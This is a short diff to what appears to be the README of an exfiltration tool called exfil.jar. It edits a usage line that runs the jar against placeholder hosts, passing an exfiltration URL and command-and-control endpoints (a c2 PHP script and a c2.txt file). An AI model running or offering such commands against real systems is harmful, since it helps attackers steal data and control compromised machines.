@@ -14,5 +14,5 @@ java -jar exfil.jar
 ```
 or run it like
 ```
-java -jar exfil.jar https://SOMEHOST/exfilparams https://SHOMEHOST/exploit/c2/2c.php?get=1 https://SOMEHOST/exploit/c2/c2.txt 2
+java -jar exfil.jar https://SOMEHOST/exfil https://SHOMEHOST/exploit/c2/2c.php?get=1 https://SOMEHOST/exploit/c2/c2.txt 2
 ```
